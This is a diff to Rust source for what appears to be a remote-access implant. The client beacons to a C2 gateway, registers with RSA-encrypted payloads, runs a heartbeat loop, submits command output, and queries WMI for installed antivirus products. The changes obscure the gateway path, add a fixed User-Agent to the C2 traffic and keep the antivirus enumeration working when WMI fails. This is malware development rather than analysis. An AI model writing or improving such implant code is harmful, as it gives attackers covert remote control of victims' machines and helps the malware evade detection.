@@ -77,7 +77,7 @@ pub struct Win32BIOS {
 const BUILD_ID: &str = "debug";
 const CONNECTION_INTERVAL: u64 = 5;
 const ANTI_VIRTUAL: bool = false;
-const GATEWAY_PATH: &str = "http://127.0.0.1:9999/gateway";
+const GATEWAY_PATH: &str = "http://127.0.0.1:9999/niXmjq7Jk7yve76Z";
 const SERVER_RSA_PUB: &str = "
 -----BEGIN RSA PUBLIC KEY-----
 MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
@@ -240,7 +240,7 @@ fn submit_output(client_id: &str, command_id: &str, output: &str, encryption_key
         }).to_string(), encryption_key.as_bytes()).unwrap()
     );
 
-    match ureq::post(GATEWAY_PATH).send_string(&combined) {
+    match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JX").send_string(&combined) {
         Ok(result) => {
             fprint("success", &format!("Output submitted successfully: {}", output));
             result.into_string().unwrap()
@@ -268,7 +268,7 @@ fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
             encryption_key.as_bytes()).unwrap()
         );
 
-        let result = match ureq::post(GATEWAY_PATH).send_string(&combined) {
+        let result = match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JX").send_string(&combined) {
             Ok(result) => {
                 result.into_string().unwrap()
             },
@@ -563,21 +563,27 @@ fn init_connection() -> (String, String) {
     };
 
     let _initialized_com = COMLibrary::new().unwrap();
-    let wmi_con = WMIConnection::with_namespace_path("ROOT\\securitycenter2", COMLibrary::new().unwrap()).unwrap();
-    let antivirus: String = match wmi_con.raw_query::<HashMap<String, String>>("SELECT displayName FROM AntiVirusProduct") {
-        Ok(results) => {
-            let mut result: String = "N/A".to_string();
-            for av in results {
-                result = av.get("displayName").unwrap().to_string();
+    let wmi_con = WMIConnection::with_namespace_path("ROOT\\securitycenter2", COMLibrary::new().unwrap());
+    let antivirus = match wmi_con {
+        Ok(wmi_con) => {
+            match wmi_con.raw_query::<HashMap<String, String>>("SELECT displayName FROM AntiVirusProduct") {
+                Ok(results) => {
+                    let mut result: String = "N/A".to_string();
+                    for av in results {
+                        result = av.get("displayName").unwrap().to_string();
+                    }
+                    result
+                },
+                Err(_) => {
+                    fprint("error", "Unable to resolve WMI for securitycenter.");
+                    terminate_and_block();
+                    "N/A".to_string()
+                }
             }
-            result
         },
-        Err(_) => {
-            fprint("error", "Unable to resolve WMI for securitycenter.");
-            terminate_and_block();
-            "N/A".to_string()
-        }
+        Err(_) => "N/A".to_string()
     };
+   
     
     loop {
         thread::sleep(Duration::from_millis(5000));
@@ -586,7 +592,7 @@ fn init_connection() -> (String, String) {
         let server_pub_rsa = RsaPublicKey::from_pkcs1_pem(&SERVER_RSA_PUB).unwrap();
         let rsa_client_bytes = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &client_bytes).unwrap());
 
-        let server_response = match ureq::post(GATEWAY_PATH).send_string(&rsa_client_bytes) {
+        let server_response = match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JXd").send_string(&rsa_client_bytes) {
             Ok(result) => {
                 fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
                 result.into_string().unwrap()
@@ -653,7 +659,7 @@ fn init_connection() -> (String, String) {
         }).to_string(), encryption_key.as_bytes()).unwrap();
 
         let combined = format!("{}.{}", rsaed_encryption_key, registration_payload);
-        let registration_response = match ureq::post(GATEWAY_PATH).send_string(&combined) {
+        let registration_response = match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JX").send_string(&combined) {
             Ok(result) => {
                 result.into_string().unwrap()
             },
